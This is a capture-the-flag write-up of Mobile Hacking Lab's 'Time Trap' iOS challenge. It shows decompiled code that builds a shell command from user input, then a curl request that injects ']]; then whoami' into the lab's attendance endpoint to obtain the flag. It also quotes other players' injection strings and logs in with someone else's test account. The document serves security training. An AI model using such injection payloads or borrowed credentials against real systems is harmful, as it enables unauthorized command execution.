**Description**: Welcome to the **Time Trap Challenge**. In this challenge, you will explore the vulnerabilities in an internally used application named Time Trap, focusing on Command Injection. Time Trap is a fictional application that showcases insecure practices commonly found in internal applications. Your objective is to exploit the Command Injection vulnerability to gain unauthorized access and execute commands on the iOS device.

**Download**: https://lautarovculic.com/my_files/timeTrap.ipa
**Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-time-trap

![[timeTrap1.png]]

Install an **IPA** file can be difficult.
So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
**LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE

**NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.

Once you have the app installed, let's proceed with the challenge.
**Unzip** the **`.ipa`** file for analyze the **`Info.plist`**
```bash
cd Payload/Time\ Trap.app && plutil -convert xml1 Info.plist && cat Info.plist
```

```XML
<array>
    <dict>
        <key>CFBundleTypeRole</key>
        <string>Viewer</string>
        <key>CFBundleURLName</key>
        <string>com.mobilehackinglab.Gotham-Times</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>gothamtimes</string>
        </array>
    </dict>
</array>
```
That's interesting.
We have the **Gotham Times** scheme (may be it's login implementation? - due that we can't create a new user account).

*Note*
*You can find the Gotham Times challenge writeup in my website*.

Anyway, that's don't work for me.
But, that's make a kind of supposition about how app talk with the server.
MHL Team says that user "*emp002*" have a *weak password*. But, this user doesn't exists.
Then, I believe and with the hope that another user that actually has solved this challenge has create an user named **`test:test`** and yes, that's works and we are in!

We can **intercept the request** when we try to log in.
```HTTP
POST /time-trap/login HTTP/2
Host: mhl.pages.dev
Accept: */*
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Time%20Trap/1 CFNetwork/1410.1 Darwin/22.6.0
Content-Length: 37
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

{
	"username":"test",
	"password":"test"
}
```

We receive the **JWT** token, which means that its successful!
```JSON
{"user":"test","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3Mzk0NzUxMjZ9.ZS7P90a48kIAIrE4XHYWYx1q8FpyjySISz1NVJHl6bc"}
```

*Note: idk if this is because Im using an existent account, but **Check in** button isn't work for me.*

Also, notice that there are a **quickly request** when we are in the main screen.
Which is
```HTTP
GET /time-trap/attendance-list HTTP/2
Host: mhl.pages.dev
Accept: */*
Accept-Encoding: gzip, deflate, br
User-Agent: Time%20Trap/1 CFNetwork/1410.1 Darwin/22.6.0
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3Mzk0NzYyNjB9.06_zRX-aqoLZHuWEzw3JWG2qQRQ7vSHtt8Oeeouessc
```

And the response will have a body like this
```JSON
[
    {
        "id": 130,
        "user_id": 2,
        "uname": "{\"}",
        "check_in": "2025-02-08 12:03:24",
        "check_out": "2025-02-08 12:03:31"
    },
    {
        "id": 129,
        "user_id": 2,
        "uname": "{}",
        "check_in": "2025-02-08 12:02:42",
        "check_out": "2025-02-08 12:03:22"
    },
    {
        "id": 128,
        "user_id": 2,
        "uname": [],
        "check_in": "2025-02-08 12:02:30",
        "check_out": "2025-02-08 12:02:32"
    },
    {
        "id": 127,
        "user_id": 2,
        "uname": "]]; then ls; fi #",
        "check_in": "2025-02-08 12:02:09",
        "check_out": "2025-02-08 12:02:12"
    },
    {
        "id": 126,
        "user_id": 2,
        "uname": "|| curl"
    }
]
```
Obviously this was made by **another user**.

But we can identify that we have an **command injection**.
Let's inspect this behavior in the binary file.

Using burp *request and response information*
```bash
strings "Time Trap" | grep -E 'check_in|check_out|uname|attendance'
```
Output:
```bash
check_in
check_in
check_out
check_out
if [[ $(uname -a) != "
" ]]; then uname -a; fi
uname -a
uname
https://mhl.pages.dev/time-trap/attendance-list
https://mhl.pages.dev/time-trap/attendance
```

Notice that there are a **new endpoint**, which is
`https://mhl.pages.dev/time-trap/attendance`

Let's discover more info about this. But now moving into **ghidra**
Here's the **`buttonPressed`** function.
```CPP
void __thiscall
Time_Trap::AttendanceController::buttonPressed(AttendanceController *this, UIButton *param_1) {
  AttendanceController *pAVar7;
  String uname, uname_00;
  UIButton *local_200;

  local_200 = param_1;
  _objc_msgSend(local_200, "setEnabled:", 0);
  _objc_retain();

  dword dVar19 = 0x2332b;
  _objc_msgSend(local_200, "setEnabled:", dVar19 & 1);
  _objc_release();

  if ((dVar19 & 0xff) != 0xff) {
    if ((dVar19 & 1) == 0) {
      DefaultStringInterpolation local_4f8;
      _swift_bridgeObjectRetain();
      SVar24 = Swift::String::init("if [[ $(uname -a) != \"", 0x16, 1);
      Swift::DefaultStringInterpolation::appendLiteral(SVar24, local_4f8);
      _swift_bridgeObjectRelease(local_4f8);
      Swift::DefaultStringInterpolation::$appendInterpolation((char*)&local_168, (DefaultStringInterpolation)PTR_$$type_metadata_for_Swift.String_100028460);
      SVar24 = Swift::String::init("\" ]]; then uname -a; fi", 0x17, 1);
      Swift::DefaultStringInterpolation::appendLiteral(SVar24, local_4f8);
      _swift_bridgeObjectRelease(local_4f8);
      SVar24 = Swift::String::init(local_4f8);
      _executeCommand();
      _objc_retainAutoreleasedReturnValue();

      uname = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC();
      _objc_release();

      if (uname.bridgeObject == nullptr) {
        Swift::_assertionFailure("Unexpectedly found nil while unwrapping an Optional value", ...);
      }
      updateAttendance(uname);
      _swift_bridgeObjectRelease();

      _objc_msgSend(_OBJC_CLASS_$_NSTimer, "scheduledTimerWithTimeInterval:target:selector:userInfo:repeats:",
                    1.0, this, "updateTime", 0, 1);
      _objc_retainAutoreleasedReturnValue();

      _objc_msgSend(local_200, "setTitle:forState:", "Check In", 0);
    } else {
      _executeCommand("uname -a");
      _objc_retainAutoreleasedReturnValue();

      uname = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC();
      _objc_release();

      updateAttendance(uname);
      _swift_bridgeObjectRelease();

      _objc_msgSend(_OBJC_CLASS_$_NSTimer, "scheduledTimerWithTimeInterval:target:selector:userInfo:repeats:",
                    1.0, this, "updateTime", 0, 1);
      _objc_retainAutoreleasedReturnValue();

      _objc_msgSend(local_200, "setTitle:forState:", "Check Out", 0);
    }
  } else {
    _swift_errorRetain();
    _swift_getErrorValue();
    _swift_errorRelease();
  }

  _objc_msgSend(local_200, "setEnabled:", 1);
}
```
This version of the code is **super condensed and summarized**.

We can see the bash command
```bash
if [[ $(uname -a) != "" ]]; then uname -a; fi
```
So, how we can abuse this command?

Looking the **`buttonPressed`** function, we can see another function: **`updateAttendance(uname);`**

Here's a **condensed and summarized** concept:
```CPP
void Time_Trap::updateAttendance(String uname) {
    URLRequest *local_148;
    NSDictionary *local_190;
    Data local_188;
    String local_1f0;

    // Building the URL
    local_1f0 = Swift::String::init("https://mhl.pages.dev/time-trap/attendance", 0x2a, 1);
    local_148 = Foundation::URLRequest::init(local_1f0);
    _swift_bridgeObjectRelease(local_1f0.bridgeObject);

    // Setting method HTTP to POST
    Foundation::URLRequest::$set_httpMethod(local_148, "POST");

    // Building JSON with uname
    Swift::Dictionary local_1b8;
    local_1b8["uname"] = uname;

    // JSON to Data
    local_190 = (extension_Foundation)::Swift::Dictionary::_bridgeToObjectiveC(local_1b8);
    local_188.unknown = _objc_msgSend(_OBJC_CLASS_$_NSJSONSerialization, 
                                      "dataWithJSONObject:options:error:", local_190, 0, 0);


    if (local_188.unknown == nullptr) {
        Swift::String::init("Failed to serialize parameters");
        return;
    }

    // Setting the request body with the JSON
    Foundation::URLRequest::$set_httpBody(local_148, local_188);

    // Send the request with NSURLSession
    NSURLRequest *local_220 = Foundation::URLRequest::_bridgeToObjectiveC(local_148);
    NSURLSession *local_210 = _objc_msgSend(_OBJC_CLASS_$_NSURLSession, "sharedSession");

    _objc_msgSend(local_210, "dataTaskWithRequest:completionHandler:", local_220, 
                  ^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error != nullptr) {
            Swift::String::init("Error sending request");
        } else {
            Swift::String::init("Attendance updated successfully");
        }
    });

    // Free mem
    _objc_release(local_220);
    _objc_release(local_210);
}
```

We can inject a command in this request.
It seems that the command is sent **via POST**.
First, we need a **valid JWT**
Get it with
```bash
curl -X POST "https://mhl.pages.dev/time-trap/login" \
     -H "Content-Type: application/json" \
     --data '{"username":"test","password":"test"}'
```

Copy the **JWT**
And then create this file as payload
```JSON
{
	"uname":"]]; then whoami"
}
```

```bash
curl -X POST "https://mhl.pages.dev/time-trap/attendance" \
     -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3Mzk0ODE3OTl9.skLusBB-PjBQ7dDJ1xfu4a_W2P5KLNoICbSm9UISRuQ" \
     -H "Content-Type: application/json" \
     -d @request.json
```

We get the flag as response:
```JSON
{
    "id": 148,
    "user_id": 2,
    "uname": "]]; then whoami",
    "check_in": "2025-02-13 21:25:02",
    "check_out": null,
    "flag": "MHL{9_t0_5_C0mm4ndz_Sl4v1ng_4w4y}"
}
```

Flag: **`MHL{9_t0_5_C0mm4ndz_Sl4v1ng_4w4y}`**

I hope you found it useful (: